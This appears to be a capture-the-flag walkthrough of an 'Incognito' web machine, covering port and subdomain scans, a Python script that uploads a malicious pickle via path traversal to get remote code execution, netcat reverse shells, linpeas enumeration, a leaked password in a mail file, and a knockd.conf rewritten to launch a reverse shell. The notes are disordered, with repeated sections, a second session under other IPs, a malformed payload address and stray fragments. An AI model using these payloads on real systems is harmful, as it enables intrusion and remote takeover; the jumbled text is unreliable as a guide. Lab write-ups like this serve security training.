

<p>Part of Incognito 2.0 CTF<br>

Note- The machine may take about 5 minutes to fully boot.<br>
Like my work, Follow on Twitter to be updated and know more about my work! (@0cirius0)</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>d14def35ed0bd914c1c5881fa0fa8090</code></strong><br>
<p></p>


> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <strong><code>_________________________</code></strong><br>
<p></p>


<h1 align="center">Port Scanning</h1>

```bash
:~/GameBuzz# nmap -sC -sV -Pn -n -p- -T4 10.67.143.85
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-28 18:40 GMT
Nmap scan report for 10.67.143.85
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Incognito

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

<img width="1273" height="226" alt="image" src="https://github.com/user-attachments/assets/dcb06092-9f5e-4490-bf96-1024879718b9" />

<br>
<br>
<h1 align="center">Web Vulnerability Scanning</h1>

```bash
:~/GameBuzz# nikto -h http://10.67.143.85
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.67.143.85
+ Target Hostname:    dev.incognito.com
+ Target Port:        80
+ Start Time:         2025-12-28 18:42:18 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x39 0x5bc657239840a 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-12-28 18:42:26 (GMT0) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<br>
<h1 align="center">Static Host Mapping</h1>

```bash
10.67.143.83  incognito.com
```

<br>
<br>
<h1 align="center">Subdomain Enumeration</h1>

```bash
:~/GameBuzz# ffuf -u http://incognito.com/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.incognito.com" -fl 429 -ic -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://incognito.com/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.incognito.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 429
________________________________________________

dev                     [Status: 200, Size: 57, Words: 5, Lines: 2]
:: Progress: [114528/114528] :: Job [1/1] :: 506 req/sec :: Duration: [0:04:28] :: Errors: 0 ::
```


<h1 align="center">Static Host Mapping</h1>

```bash
10.67.143.83  dev.incognito.com incognito.com
```

<h1 align="center">Web Interface Inspection</h1>
<p align="center">incognito.com</p>

<img width="1316" height="729" alt="image" src="https://github.com/user-attachments/assets/704ee293-792d-4242-bdc0-73c056c414bf" />

<img width="1311" height="723" alt="image" src="https://github.com/user-attachments/assets/2226cb74-21c5-4942-96c1-613752cf13a6" />

<img width="1268" height="456" alt="image" src="https://github.com/user-attachments/assets/4b3ac352-d37e-4e29-af08-fdabe831981c" />


```bash
{"object":"/var/upload/games/object.pkl"}
```

```bash
{"Game": "GTA5", "Rating": 9, "Review": "Nice"}
```

<img width="1282" height="467" alt="image" src="https://github.com/user-attachments/assets/ec873cfa-948f-4af7-ba8c-be5f19dabed6" />

```bash
{"object":"/var/upload/games/object1.pkl"}
```

```bash
{"Game": "Red Dead Redemption 2", "Rating": 10, "Review": "Too Good"}
```


<img width="1276" height="463" alt="image" src="https://github.com/user-attachments/assets/26e3bf99-c9ae-403c-98b2-ae63b119a0b2" />


<br>
<br>

```bash
{"object":"/var/upload/games/object2.pkl"}
```

```bash
{"Game": "Valorant", "Rating": 7, "Review": "Okay"}
```

<br>
<br>
<br>
<h1 align="center">Directory & File Enumeration</h1>
<p align="center">dev.incognito.com</p>

```bash
:~/GameBuzz# ffuf -u http://dev.incognito.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -c -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.incognito.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 57, Words: 5, Lines: 2]
secret                  [Status: 301, Size: 323, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://dev.incognito.com/secret/FUZZ

                        [Status: 200, Size: 57, Words: 5, Lines: 2]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10]
[INFO] Starting queued job on target: http://dev.incognito.com/secret/FUZZ

                        [Status: 403, Size: 282, Words: 20, Lines: 10]
upload                  [Status: 301, Size: 330, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://dev.incognito.com/secret/upload/FUZZ

                        [Status: 403, Size: 282, Words: 20, Lines: 10]
[INFO] Starting queued job on target: http://dev.incognito.com/secret/upload/FUZZ

                        [Status: 200, Size: 370, Words: 58, Lines: 15]
                        [Status: 200, Size: 370, Words: 58, Lines: 15]
:: Progress: [220547/220547] :: Job [3/3] :: 8873 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

<img width="1260" height="651" alt="image" src="https://github.com/user-attachments/assets/7324d6d3-d4f8-45e5-a880-1bbec5bf3902" />

<br>
<br>
<br>
<h1 align="center">Web Interface Inspection</h1>
<p align="center">dev.incognito.com</p>

<img width="1211" height="220" alt="image" src="https://github.com/user-attachments/assets/dd61d2e4-39dc-4a20-8e8e-d1bf66ef32ba" />

<br>
<br>
<br>

<img width="1216" height="243" alt="image" src="https://github.com/user-attachments/assets/c30aeda4-2683-4cc0-9275-c9d79639ea5f" />





```bash
:~# cat w.py
#!/usr/bin/env python3

import requests
import pickle
import os

class PickleRCE:
    def __reduce__(self):
        return (os.system,("bash -c '/bin/bash -i >& /dev/tcp/10.67.76.2554444 0>&1' ",))


def main():
    uploadURL = 'http://dev.incognito.com/secret/upload/script.php'
    uploadData = {'submit': 'Start Upload'}

    filename = 'r.pkl'
    file = {
        'the_file': (f'../../../../../../../../../var/upload/{filename}', pickle.dumps(PickleRCE()))
    }

    uploadRequestResult = requests.post(uploadURL, data=uploadData, files=file)
    print(f'[*] Upload file request:\n{uploadRequestResult.text}')

    pickleURL = 'http://incognito.com/fetch'
    pickleData = {'object': f'/var/upload/{filename}'}

    pickleRequestResult = requests.post(pickleURL, json=pickleData)
    print(f'[*] Fetch pickle request:\n{pickleRequestResult.text}')

if __name__ == '__main__':
    main()
```


```bash
:~/GameBuzz# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~/GameBuzz# python3 w.py
[*] Upload file request:
The file r.pkl has been uploaded
```


```bash
:~/GameBuzz# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.67.143.85 57030
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
www-data@incognito:/$ which python3
which python3
/usr/bin/python3
www-data@incognito:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@incognito:/$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/GameBuzz# stty raw -echo; fg
nc -nlvp 4444

www-data@incognito:/$ export TERM=xterm
www-data@incognito:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(nosu)
www-data@incognito:/$ pwd
/
www-data@incognito:/$ hostname
incognito
```

<img width="1206" height="415" alt="image" src="https://github.com/user-attachments/assets/3504c00f-8f76-4b4e-b2c0-20fee394e430" />

<br>
<br>
<br>

```bash
www-data@incognito:/$ cd /home
www-data@incognito:/home$ ls
dev1  dev2
www-data@incognito:/home$ cd dev1
bash: cd: dev1: Permission denied
www-data@incognito:/home$ cd dev2
www-data@incognito:/home/dev2$ ls -lah
total 40K
drwxr-xr-x 6 dev2 dev2 4.0K Jun 11  2021 .
drwxr-xr-x 4 root root 4.0K Mar  1  2021 ..
lrwxrwxrwx 1 dev2 dev2    9 Mar  1  2021 .bash_history -> /dev/null
-rw-r--r-- 1 dev2 dev2  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev2 dev2 3.7K Apr  4  2018 .bashrc
drwx------ 2 dev2 dev2 4.0K Feb 28  2021 .cache
drwxr-x--- 3 dev2 dev2 4.0K Mar  1  2021 .config
drwx------ 3 dev2 dev2 4.0K Mar  1  2021 .gnupg
drwxrwxr-x 3 dev2 dev2 4.0K Mar  1  2021 .local
-rw-r--r-- 1 dev2 dev2  807 Apr  4  2018 .profile
-rw-r--r-- 1 dev2 dev2    0 Feb 28  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 dev2 dev2   33 Mar  1  2021 user.txt
www-data@incognito:/home/dev2$ cat user.txt
d14def35ed0bd914c1c5881fa0fa8090
```

<img width="1208" height="452" alt="image" src="https://github.com/user-attachments/assets/ee839002-ac25-4836-87de-2205423e9856" />

<br>
<br>
<br>

```bash
:~/GameBuzz# ls
linpeas.sh  w.py
:~/GameBuzz# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/GameBuzz# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.67.143.85 - - [28/Dec/2025 19:23:34] "GET / HTTP/1.1" 200 -
10.67.143.85 - - [28/Dec/2025 19:23:55] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
www-data@incognito:/tmp$ wget http://10.67.76.255:8000/linpeas.sh
--2025-12-28 19:23:54--  http://10.67.76.255:8000/linpeas.sh
Connecting to 10.67.76.255:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 227.91K  --.-KB/s    in 0.001s  

2025-12-28 19:23:54 (234 MB/s) - 'linpeas.sh' saved [233380/233380]

www-data@incognito:/tmp$ chmod +x linpeas.sh
www-data@incognito:/tmp$ ./linpeas.sh
```

<img width="1202" height="295" alt="image" src="https://github.com/user-attachments/assets/3c99c508-4854-4eb7-b85d-436f9fb73792" />

<img width="1313" height="169" alt="image" src="https://github.com/user-attachments/assets/82230288-c711-4472-9aad-c80496d016ea" />

<img width="1324" height="298" alt="image" src="https://github.com/user-attachments/assets/38ffe6b4-f956-45aa-85ca-387fb466b7e3" />

<img width="1315" height="149" alt="image" src="https://github.com/user-attachments/assets/ecfc67ae-1fb1-47bb-9605-9cfb60a2229b" />


```bash
www-data@incognito:/var/mail$ ls -lah
total 12K
drwxrwsr-x  2 root mail 4.0K Aug 11  2021 .
drwxr-xr-x 15 root root 4.0K Mar  6  2021 ..
-rw-r--r--  1 root mail   90 Aug 11  2021 dev1
```

```bash
www-data@incognito:/var/mail$ cat dev1
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!
```

<br>
<br>
<p align="center">knockd.conf</p>

<img width="1315" height="367" alt="image" src="https://github.com/user-attachments/assets/db10bab9-adbf-423b-ada3-4431ef5ea96a" />

```bash
www-data@incognito:/etc$ cat knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn
```



:~/GameBuzz# cat knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /bin/bash -c '/bin/bash -i >& /dev/tcp/10.67.76.255/9001 0>&1'
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn



```bash
:~/GameBuzz# knock -v 10.67.143.85 5020 6120 7340
...
```


```bash
~/GameBuzz# nmap -p 22 10.67.143.85
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-28 21:37 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for dev.incognito.com (10.67.143.85)
Host is up (0.00035s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds


```

<img width="1304" height="701" alt="image" src="https://github.com/user-attachments/assets/02146c49-2378-4472-a894-cf0de80aeb00" />


<br>
<br>
<br>

```bash
:~/GameBuzz# apt install knockd
...
```

```bash
:~/GameBuzz# knock -v 10.67.143.85 5020 6120 7340
hitting tcp 10.67.143.85:5020
hitting tcp 10.67.143.85:6120
hitting tcp 10.67.143.85:7340
```


<img width="1391" height="145" alt="image" src="https://github.com/user-attachments/assets/6f1e5a2b-ffcf-47c8-b6d2-8b80985d6869" />


<br>
<br>
<br>


```bash
www-data@incognito:/$ su dev2
dev2@incognito:~$
```

```bash
dev2@incognito:~$ ls
user.txt
```

```bash
dev2@incognito:~$ cat user.txt
d14def35ed0bd914c1c5881fa0fa8090
```




```bash
www-data@incognito:/tmp$ ./linpeas.sh > report.txt
```


```bash
www-data@incognito:/tmp$ ./linpeas.sh > report.txt
```

```bash
:~# python3 w.py
[*] Upload file request:
The file r.pkl has been uploaded
[*] Fetch pickle request:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```
```


```bash
:~# gobuster dir -u http://10.64.164.169 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.164.169
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/static               (Status: 301) [Size: 315] [--> http://10.64.164.169/static/]
/fetch                (Status: 405) [Size: 178]
```



```bash
:~# nikto -h http://10.64.164.169
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.64.164.169
+ Target Hostname:    10.64.164.169
+ Target Port:        80
+ Start Time:         2025-12-28 01:01:48 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /, fields: 0x39 0x5bc657239840a 
+ Allowed HTTP Methods: OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-12-28 01:02:00 (GMT0) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~# curl -v -X OPTIONS http://10.64.164.169/fetch
*   Trying 10.64.164.169:80...
* TCP_NODELAY set
* Connected to 10.64.164.169 (10.64.164.169) port 80 (#0)
> OPTIONS /fetch HTTP/1.1
> Host: 10.64.164.169
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, 28 Dec 2025 01:08:40 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Allow: POST, OPTIONS
< Content-Length: 0
< Content-Type: text/html; charset=utf-8
< 
* Connection #0 to host 10.64.164.169 left intact
```


<img width="1187" height="789" alt="image" src="https://github.com/user-attachments/assets/f4f964f2-aa46-42e6-bc70-e3a6a3264f26" />


<img width="1181" height="718" alt="image" src="https://github.com/user-attachments/assets/2627b258-8a89-46a4-9fc6-f0f302e16dac" />


<img width="1181" height="723" alt="image" src="https://github.com/user-attachments/assets/ffb66491-4b5d-4321-bc81-412dff4432a2" />


<img width="1241" height="340" alt="image" src="https://github.com/user-attachments/assets/afe67f4a-8988-4617-a19e-79db1251bc67" />

<img width="1226" height="348" alt="image" src="https://github.com/user-attachments/assets/96081de1-3d6a-4d10-8571-8e51de93cffc" />





```bash
:~# ffuf -u 'http://incognito.com/' -H "Host: FUZZ.incognito.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 60 -ic -mc all -fs 20637

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://incognito.com/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.incognito.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: all
 :: Filter           : Response size: 20637
________________________________________________

dev                     [Status: 200, Size: 57, Words: 5, Lines: 2]
gc._msdcs               [Status: 400, Size: 430, Words: 42, Lines: 13]
_domainkey              [Status: 400, Size: 430, Words: 42, Lines: 13]
:: Progress: [19981/19981] :: Job [1/1] :: 506 req/sec :: Duration: [0:00:47] :: Errors: 0 ::

```


<img width="1188" height="462" alt="image" src="https://github.com/user-attachments/assets/524907ca-4099-48f3-8bec-00c90b0112b2" />


<img width="1182" height="221" alt="image" src="https://github.com/user-attachments/assets/75d27f98-7f81-44de-aa72-113efc897b37" />





```bash
:~# gobuster dir -u http://dev.incognito.com/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.incognito.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 301) [Size: 323] [--> http://dev.incognito.com/secret/]
/server-status        (Status: 403) [Size: 282]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

<img width="1186" height="341" alt="image" src="https://github.com/user-attachments/assets/80cc16c5-7cfa-4b52-b62b-aa8867757859" />

```bash
:~# gobuster dir -u http://dev.incognito.com/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.incognito.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 57]
/robots.txt           (Status: 200) [Size: 32]
/secret               (Status: 301) [Size: 323] [--> http://dev.incognito.com/secret/]
/.php                 (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/server-status        (Status: 403) [Size: 282]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```


<img width="1181" height="183" alt="image" src="https://github.com/user-attachments/assets/104b82f6-06fd-4b97-9c51-2647b85000ff" />


<img width="1231" height="318" alt="image" src="https://github.com/user-attachments/assets/81edc6c6-4138-490f-9833-d935739b1146" />


```bash
:~# gobuster dir -u http://dev.incognito.com/secret/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.incognito.com/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/upload               (Status: 301) [Size: 330] [--> http://dev.incognito.com/secret/upload/]
```


<img width="1262" height="323" alt="image" src="https://github.com/user-attachments/assets/95b44a10-6b90-4cea-ba41-6c5982ba5a1b" />

```bash
:~# gobuster dir -u http://dev.incognito.com/secret/upload/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.incognito.com/secret/upload/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/index.html           (Status: 200) [Size: 370]
/script.php           (Status: 200) [Size: 6]

```


<img width="1267" height="453" alt="image" src="https://github.com/user-attachments/assets/0f826e62-9dc3-4026-8b95-c8c51997e840" />

<img width="1183" height="151" alt="image" src="https://github.com/user-attachments/assets/101e90cd-e72f-4b75-a059-9fea851ba1df" />

<img width="1191" height="172" alt="image" src="https://github.com/user-attachments/assets/8218c68e-47c1-4598-a860-8847920b8ec9" />


<img width="1183" height="319" alt="image" src="https://github.com/user-attachments/assets/24f02191-3346-4403-807d-a11d08998290" />


```bash
:~# cat script.py
import pickle
import sys

a = "bash -i >& /dev/tcp/10.64.96.44/4444 0>&1"
b = sys.argv[1] if len(sys.argv) > 1 else a

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(b,))
print pickle.dumps(rce())
```





<img width="1181" height="158" alt="image" src="https://github.com/user-attachments/assets/b6a42db5-89fa-4f07-b24c-884c8e8bace4" />


<img width="1169" height="342" alt="image" src="https://github.com/user-attachments/assets/d3e0cda7-2751-407c-956c-585dacc181d1" />





```bash
:~# python3 w.py
[*] Upload file request:
The file r.pkl has been uploaded
```


```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
...
```



www-data@incognito:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@incognito:/$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444

www-data@incognito:/$ export TERM=xterm
www-data@incognito:/$ 


<img width="1156" height="367" alt="image" src="https://github.com/user-attachments/assets/fd255a13-c8db-493e-b5d3-b95cc49b0658" />



<img width="728" height="328" alt="image" src="https://github.com/user-attachments/assets/8d978edf-0fe2-4cab-acf5-76f33972a127" />



```bash
www-data@incognito:/home$ ls -lah /home/dev2/
total 40K
drwxr-xr-x 6 dev2 dev2 4.0K Jun 11  2021 .
drwxr-xr-x 4 root root 4.0K Mar  1  2021 ..
lrwxrwxrwx 1 dev2 dev2    9 Mar  1  2021 .bash_history -> /dev/null
-rw-r--r-- 1 dev2 dev2  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev2 dev2 3.7K Apr  4  2018 .bashrc
drwx------ 2 dev2 dev2 4.0K Feb 28  2021 .cache
drwxr-x--- 3 dev2 dev2 4.0K Mar  1  2021 .config
drwx------ 3 dev2 dev2 4.0K Mar  1  2021 .gnupg
drwxrwxr-x 3 dev2 dev2 4.0K Mar  1  2021 .local
-rw-r--r-- 1 dev2 dev2  807 Apr  4  2018 .profile
-rw-r--r-- 1 dev2 dev2    0 Feb 28  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 dev2 dev2   33 Mar  1  2021 user.txt
```


ww-data@incognito:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
dev1:x:1001:1001::/home/dev1:/bin/bash
dev2:x:1000:1000:cirius:/home/dev2:/bin/bash


```bash
www-data@incognito:/home$ cat /home/dev2/user.txt
d14def35ed0bd914c1c5881fa0fa8090
```

www-data@incognito:/$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
127.0.0.1       ip6-localhost ip6-loopback

<img width="934" height="309" alt="image" src="https://github.com/user-attachments/assets/fdae4654-7ff1-4c61-880e-f5bc237e6313" />


[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities

[+] Files with ACLs
# file: /etc/knockd.conf
USER   root      rw-     
user   dev1      rw-     
GROUP  root      r--     
mask             rw-     
other            r--



var/www/incognito.com/incognito/static/js/custom.js:				username: {


www-data@incognito:/$ knock 127.0.1.1 5020 6120 7340




www-data@incognito:/$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.64.164.169:68        0.0.0.0:*                           -      



ww-data@incognito:/$ cd /var
www-data@incognito:/var$ cd www
www-data@incognito:/var/www$ ls
dev.incognito.com  html  incognito.com
www-data@incognito:/var/www$ cd incognito.com
www-data@incognito:/var/www/incognito.com$ ls
__pycache__  incognito	incognito.wsgi
www-data@incognito:/var/www/incognito.com$ 





ww-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
#!/usr/bin/python3
import sys
import logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/incognito.com/incognito/")

from incognito import app as application
application.secret_key = 'KeepITSecret'
www-data@incognito:/var/www/incognito.com$ 





www-data@incognito:/var/www/incognito.com$ su dev2
dev2@incognito:/var/www/incognito.com$ 





```bash
ww-data@incognito:/var/mail$ cat dev1
Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
Knock yourself in!
```


Www-data@incognito:/var/mail$ ss -tunlp | grep -iE LISTEN
tcp   LISTEN  0       128             127.0.0.53%lo:53            0.0.0.0:*     
tcp   LISTEN  0       128                   0.0.0.0:22            0.0.0.0:*     
tcp   LISTEN  0       128                         *:80                  *:*     
tcp   LISTEN  0       128                      [::]:22               [::]:*     


<img width="1061" height="167" alt="image" src="https://github.com/user-attachments/assets/3308aa7f-cefd-4938-b2d5-9f7f68f86e63" />



ww-data@incognito:/etc$ cat knockd.conf
[options]
	logfile = /var/log/knockd.log

[openSSH]
	sequence    = 5020,6120,7340
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9000,8000,7000
	seq_timeout = 15
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
	tcpflags    = syn



  www-data@incognito:/$ cat /var/log/knockd.log
[2021-06-11 07:31] starting up, listening on enp0s3
[2021-06-11 07:31] 192.168.29.217: openSSH: Stage 1
[2021-06-11 07:31] 192.168.29.217: openSSH: Stage 2
[2021-06-11 07:31] 192.168.29.217: openSSH: Stage 3
[2021-06-11 07:31] 192.168.29.217: openSSH: OPEN SESAME
[2021-06-11 07:31] openSSH: running command: /sbin/iptables -I INPUT -s 192.168.29.217 -p tcp --dport 22 -j ACCEPT

